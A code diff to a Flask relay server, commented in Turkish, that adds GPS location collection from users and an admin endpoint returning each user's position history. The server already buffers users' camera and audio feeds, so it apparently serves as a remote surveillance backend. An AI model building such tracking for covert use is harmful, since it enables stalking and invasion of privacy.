@@ -35,6 +35,7 @@ relay_lock = threading.Lock()
 camera_buffers = {}       # uid -> {chunks: [{seq, data, mime, ts}], max_seq: -1}
 audio_buffers = {}        # uid -> {chunks: [{seq, data, mime, ts}], max_seq: -1}
 incoming_audio = {}       # uid -> {chunks: [{seq, data, mime, ts}], max_seq: -1}
+location_data = {}         # uid -> {positions: [{lat, lng, acc, speed, heading, alt, ts, time}], count: 0}
 
 # ==================== YARDIMCI ====================
 
@@ -53,6 +54,7 @@ def clean_stale_users():
             camera_buffers.pop(uid, None)
             audio_buffers.pop(uid, None)
             incoming_audio.pop(uid, None)
+            location_data.pop(uid, None)
 
 
 # ==================== ADMIN TOKEN (HMAC — server-state gerekmez) ====================
@@ -268,6 +270,38 @@ def api_relay_incoming_audio(uid):
     })
 
 
+@app.route("/api/relay/location", methods=["POST"])
+def api_relay_location():
+    """Kullanıcıdan GPS konum verisini al, bellekte tut."""
+    data = request.get_json() or {}
+    uid = data.get("uid", "")
+    lat = data.get("latitude")
+    lng = data.get("longitude")
+
+    if not uid or lat is None or lng is None:
+        return jsonify({"status": "error", "error": "eksik veri"}), 400
+
+    with relay_lock:
+        if uid not in location_data:
+            location_data[uid] = {"positions": [], "count": 0}
+        buf = location_data[uid]
+        pos = {
+            "lat": lat, "lng": lng,
+            "acc": data.get("accuracy"),
+            "speed": data.get("speed"),
+            "heading": data.get("heading"),
+            "alt": data.get("altitude"),
+            "ts": data.get("timestamp", time.time() * 1000),
+            "time": time.time()
+        }
+        buf["positions"].append(pos)
+        buf["count"] += 1
+        if len(buf["positions"]) > 200:
+            buf["positions"] = buf["positions"][-200:]
+
+    return jsonify({"status": "ok", "count": buf["count"]})
+
+
 # ==================== ADMIN — KULLANICI VERİSİNİ ÇEKME ====================
 
 @app.route("/api/admin/users")
@@ -390,6 +424,25 @@ def api_admin_send_audio(uid):
             buf["chunks"] = buf["chunks"][-20:]
 
     return jsonify({"status": "ok", "seq": seq})
+
+
+@app.route("/api/admin/location/<uid>")
+def api_admin_location(uid):
+    """Admin için kullanıcının GPS konum geçmişini döndür."""
+    session = require_admin(request)
+    if not session:
+        return jsonify({"status": "error", "error": "Yetkisiz"}), 401
+
+    with relay_lock:
+        loc = location_data.get(uid, {"positions": [], "count": 0})
+        current = loc["positions"][-1] if loc["positions"] else None
+
+    return jsonify({
+        "status": "ok",
+        "current": current,
+        "positions": loc["positions"],
+        "count": loc["count"]
+    })
 
 
 # ==================== IP KONUM API ====================
